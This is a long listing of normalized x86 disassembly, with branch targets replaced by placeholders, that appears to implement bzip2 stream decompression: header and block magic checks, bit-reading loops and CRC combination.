mov [ esi + 0x3c ] eax
mov eax [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edi ]
movzx ecx al
movzx eax [ ebx + eax * 2 ]
and cl 0x1
shl cl 0x2
shr edx cl
and edx 0xf
shl edx 0x10
or edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x38 ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
and [ esi + 0x18 ] 0x0
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1000d143
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec [ esi + 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x14 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
xor eax eax
cmp ecx 0x1
movzx ecx [ ebp - 0x1 ]
sete al
xor eax ecx
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1000d143
mov edx [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ esi + 0x3c ] eax
movzx edi [ ecx + edi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
movzx ecx [ ebx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
mov ecx [ esi + 0x14 ]
mov [ esi + 0x38 ] edi
test ecx ecx
jne r-xdata
and [ esi + 0x18 ] 0x0
dec [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor edx edx
cmp ecx 0x1
sete dl
xor edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x3c ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
and [ esi + 0x18 ] 0x0
sub_1000d790
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop esi
retn
cmp [ esi ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ebx
cmp ecx 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ecx 0x2
jne r-xdata
pop ebx
pop esi
retn
mov ecx [ esi + 0x4 ]
cmp ecx 0xa
jl r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov ebx esi
call sub_1000d9cf
cmp eax 0x4
je r-xdata
mov ecx esi
call sub_1000cc97
call sub_1000d170
jmp r-xdata
cmp [ esi + 0x30 ] 0x3
jl r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0x2
jne r-xdata
push 0xfffffffc
pop eax
jmp r-xdata
mov eax [ esi + 0xfa40 ]
inc eax
cmp [ esi + 0x440 ] eax
jne r-xdata
test al al
jne r-xdata
mov eax [ esi + 0xc64 ]
sub eax [ esi + 0xc5c ]
neg eax
sbb eax eax
and eax 0xfffffff8
add eax 0x4
push [ esi + 0xc64 ]
push [ esi + 0xc5c ]
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
add esp 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x3
mov eax [ esi + 0xc60 ]
not eax
mov [ esi + 0xc60 ] eax
jl r-xdata
cmp [ esi + 0x30 ] 0x2
jl r-xdata
push eax
push [ esi + 0xc58 ]
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
add esp 0x10
mov ecx [ esi + 0xc60 ]
cmp ecx [ esi + 0xc58 ]
jne r-xdata
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
pop ecx
pop ecx
lea eax [ esi + 0xc64 ]
mov edx [ eax ]
rol edx 0x1
xor edx ecx
mov [ eax ] edx
mov [ esi + 0x4 ] 0xe
sub_1000d8dc
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0xc4c ]
test eax eax
je r-xdata
mov eax [ edi + 0xc50 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0xc54 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_1000d941
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov edi eax
mov ebx ecx
xor eax eax
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp edi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea esi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_1000cc18
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ edi ]
mov [ ebp - 0x1c ] eax
mov eax esi
mov [ ebp - 0x20 ] ebx
call sub_1000d790
mov ebx eax
test ebx ebx
jne r-xdata
cmp ebx 0x4
je r-xdata
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x1c ]
sub [ edi ] eax
xor edi edi
lea esi [ ebp - 0x30 ]
call sub_1000d8dc
mov eax ebx
jmp r-xdata
push 0xfffffff8
jmp r-xdata
push 0xfffffff9
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_1000d8dc
mov eax edi
jmp r-xdata
sub_1000d9cf
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
push esi
mov esi [ ebx ]
xor ecx ecx
push edi
cmp eax 0xa
jne r-xdata
mov ecx [ ebx + 0xfa14 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + 0xfa18 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebx + 0xfa1c ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ebx + 0xfa20 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebx + 0xfa24 ]
mov [ ebp - 0x44 ] ecx
mov ecx [ ebx + 0xfa28 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebx + 0xfa2c ]
mov [ ebp - 0x64 ] ecx
mov ecx [ ebx + 0xfa30 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebx + 0xfa34 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebx + 0xfa38 ]
mov [ ebp - 0x54 ] ecx
mov ecx [ ebx + 0xfa3c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebx + 0xfa40 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebx + 0xfa44 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebx + 0xfa48 ]
mov [ ebp - 0x74 ] ecx
mov ecx [ ebx + 0xfa4c ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebx + 0xfa50 ]
mov [ ebp - 0x80 ] ecx
mov ecx [ ebx + 0xfa54 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx + 0xfa58 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebx + 0xfa5c ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xfa60 ]
mov [ ebp - 0x70 ] ecx
mov ecx [ ebx + 0xfa64 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebx + 0xfa68 ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebx + 0xfa6c ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebx + 0xfa70 ]
add eax 0xfffffff6
mov [ ebp - 0x4c ] ecx
cmp eax 0x28
ja r-xdata
mov [ ebx + 0xfa14 ] ecx
mov [ ebx + 0xfa18 ] ecx
mov [ ebx + 0xfa1c ] ecx
mov [ ebx + 0xfa20 ] ecx
mov [ ebx + 0xfa24 ] ecx
mov [ ebx + 0xfa28 ] ecx
mov [ ebx + 0xfa2c ] ecx
mov [ ebx + 0xfa30 ] ecx
mov [ ebx + 0xfa34 ] ecx
mov [ ebx + 0xfa38 ] ecx
mov [ ebx + 0xfa3c ] ecx
mov [ ebx + 0xfa40 ] ecx
mov [ ebx + 0xfa44 ] ecx
mov [ ebx + 0xfa48 ] ecx
mov [ ebx + 0xfa4c ] ecx
mov [ ebx + 0xfa50 ] ecx
mov [ ebx + 0xfa54 ] ecx
mov [ ebx + 0xfa58 ] ecx
mov [ ebx + 0xfa5c ] ecx
mov [ ebx + 0xfa60 ] ecx
mov [ ebx + 0xfa64 ] ecx
mov [ ebx + 0xfa68 ] ecx
mov [ ebx + 0xfa6c ] ecx
mov [ ebx + 0xfa70 ] ecx
push 0xfa1
call sub_1000cbce
mov edi 0xff
jmp [ eax * 4 + jump_table_1000f7f7 ]
mov [ ebx + 0x4 ] 0xa
jmp r-xdata
mov [ ebx + 0x4 ] 0xb
jmp r-xdata
mov [ ebx + 0x4 ] 0xc
jmp r-xdata
mov [ ebx + 0x4 ] 0xd
jmp r-xdata
mov [ ebx + 0x4 ] 0xe
jmp r-xdata
mov [ ebx + 0x4 ] 0xf
jmp r-xdata
mov [ ebx + 0x4 ] 0x10
jmp r-xdata
mov [ ebx + 0x4 ] 0x11
jmp r-xdata
mov [ ebx + 0x4 ] 0x12
jmp r-xdata
mov [ ebx + 0x4 ] 0x13
jmp r-xdata
mov [ ebx + 0x4 ] 0x14
jmp r-xdata
mov [ ebx + 0x4 ] 0x15
jmp r-xdata
mov [ ebx + 0x4 ] 0x16
jmp r-xdata
mov [ ebx + 0x4 ] 0x17
jmp r-xdata
mov [ ebx + 0x4 ] 0x18
jmp r-xdata
mov [ ebx + 0x4 ] 0x19
jmp r-xdata
mov [ ebx + 0x4 ] 0x1a
jmp r-xdata
mov [ ebx + 0x4 ] 0x1b
jmp r-xdata
mov [ ebx + 0x4 ] 0x1c
jmp r-xdata
mov [ ebx + 0x4 ] 0x1d
jmp r-xdata
mov [ ebx + 0x4 ] 0x1e
jmp r-xdata
mov [ ebx + 0x4 ] 0x1f
jmp r-xdata
mov [ ebx + 0x4 ] 0x20
jmp r-xdata
mov [ ebx + 0x4 ] 0x23
jmp r-xdata
mov [ ebx + 0x4 ] 0x22
jmp r-xdata
mov [ ebx + 0x4 ] 0x21
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x24
jmp r-xdata
mov [ ebx + 0x4 ] 0x25
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x26
jmp r-xdata
mov [ ebx + 0x4 ] 0x27
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x28
jmp r-xdata
mov [ ebx + 0x4 ] 0x29
jmp r-xdata
mov [ ebx + 0x4 ] 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] 0x2b
jmp r-xdata
mov [ ebx + 0x4 ] 0x2c
jmp r-xdata
mov [ ebx + 0x4 ] 0x2d
jmp r-xdata
mov [ ebx + 0x4 ] 0x2e
jmp r-xdata
mov [ ebx + 0x4 ] 0x2f
jmp r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov [ ebx + 0x4 ] 0x31
jmp r-xdata
mov [ ebx + 0x4 ] 0x32
jmp r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x3
jl r-xdata
cmp [ ebx + 0x20 ] 0xf
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x5
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x42
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x5a
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x68
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp eax 0x31
mov [ ebx + 0x24 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x17
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x41
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x26
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x53
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
and [ ebx + 0x34 ] 0x0
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ebx + 0x1c ]
lea ecx [ eax - 0x8 ]
shr edx cl
add eax 0xfffffff8
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x34 ]
and edx edi
movzx ecx dl
shl eax 0x8
or eax ecx
mov [ ebx + 0x34 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x10 ]
and eax 0x1
dec edx
cmp al 0x1
sete al
inc [ ebp - 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + ecx + 0xd6c ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
cmp al 0x1
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x3 ]
shr eax cl
add edx 0xfffffffd
mov [ ebx + 0x20 ] edx
and eax 0x7
cmp eax 0x2
mov [ ebp - 0x44 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0xf ]
shr eax cl
add edx 0xfffffff1
mov [ ebx + 0x20 ] edx
and eax 0x7fff
cmp eax 0x1
mov [ ebp - 0x50 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x5 ]
shr eax cl
add edx 0xfffffffb
mov [ ebx + 0x20 ] edx
and eax 0x1f
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
or ecx eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebx + 0x1c ]
xor esi esi
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x14 ]
inc esi
shl esi cl
dec esi
and eax esi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x72
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x45
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x38
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x50
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x90
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov [ ebx + 0x4 ] 0x1
push 0x4
jmp r-xdata
xor eax eax
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffb
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
